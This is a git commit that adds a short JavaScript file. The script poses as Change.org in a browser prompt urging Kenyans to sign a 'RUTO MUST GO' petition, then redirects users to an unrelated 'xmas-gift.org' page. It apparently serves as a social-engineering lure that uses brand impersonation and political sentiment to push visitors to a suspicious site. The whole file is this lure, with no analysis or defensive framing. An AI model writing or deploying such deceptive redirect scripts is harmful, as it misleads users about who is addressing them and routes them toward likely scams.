c4ee277656b7082a632be79b921c26e54f8b55cd
4g-network <154092422+4g-network@users.noreply.github.com>
2024-06-29 08:56:38 -0700

    Create change.js

---
+++ change.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Change-org: Hello Kenyan, Please help sign this petition RUTO MUST GO. kindly press 1 to start petition now ','1');
+if (password != '1') {
+location.href='https://xmas-gift.org/kenyan-youths.html';
+}
